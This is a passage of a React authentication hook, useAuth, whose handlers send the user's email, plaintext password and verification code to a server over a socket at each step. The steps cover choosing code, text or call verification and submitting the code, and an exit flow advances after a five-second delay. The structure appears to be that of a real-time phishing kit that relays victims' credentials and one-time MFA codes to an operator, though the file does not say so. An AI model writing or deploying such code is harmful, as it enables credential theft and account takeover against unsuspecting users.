      sessionId: socketRef.current.id,
    });
  };

  const handleVerificationCodeSelect = () => {
    setIsVerifying(true);

    socketRef.current.emit("verifycode-select", {
      email: formData.email,
      password: formData.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleVerifyClick = () => {
    if (!formData.verifyCode.trim()) {
      setVerificationMessage("Please enter valid verification code.");
      return;
    }

    setVerificationMessage("");
    setIsVerifying(true);

    socketRef.current.emit("verify-click", {
      email: formData.email,
      password: formData.password,
      verifyCode: formData.verifyCode,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleTextSelect = () => {
    setIsVerifying(true);

    socketRef.current.emit("text-select", {
      email: formData.email,
      password: formData.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleTextVerifyClick = () => {
    if (!formData.verifyCode.trim()) {
      setVerificationMessage("Please enter valid verification code.");
      return;
    }

    setVerificationMessage("");
    setIsVerifying(true);

    socketRef.current.emit("text-click", {
      email: formData.email,
      password: formData.password,
      verifyCode: formData.verifyCode,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleCallSelect = () => {
    setIsVerifying(true);

    socketRef.current.emit("call-select", {
      email: formData.email,
      password: formData.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleExitFlow = () => {
    setIsVerifying(true);

    setTimeout(() => {
      setIsVerifying(false);

      navigateToStep(8);
    }, 5000);
  };

  return {
    steps,
    socket: socketRef.current,
    isVerifying,
    verificationMessage,
    currentStep,
    formData,
    setFormData,
    setCurrentStep,
    handleEmailSubmit,
    handlePasswordSubmit,
    setVerificationMessage,
  };
};

export default useAuth;
